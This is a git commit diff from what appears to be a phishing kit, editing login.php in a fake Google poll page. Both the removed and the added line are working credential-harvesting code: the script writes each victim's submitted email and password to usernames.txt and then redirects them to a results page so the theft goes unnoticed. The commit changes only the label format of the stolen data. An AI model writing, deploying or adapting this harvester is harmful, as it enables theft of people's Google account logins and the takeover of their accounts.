de2c6b79548bce22f5ecb47c9210897a096e9bae
Tahmid Rayat <56682134+htr-tech@users.noreply.github.com>
2019-11-27 18:38:33 +0600

    Update login.php

--- websites/google_poll/login.php
+++ websites/google_poll/login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Gmail :- " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Username: " . $_POST['email'] . "Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
 header('Location: ./result.html');
 exit();
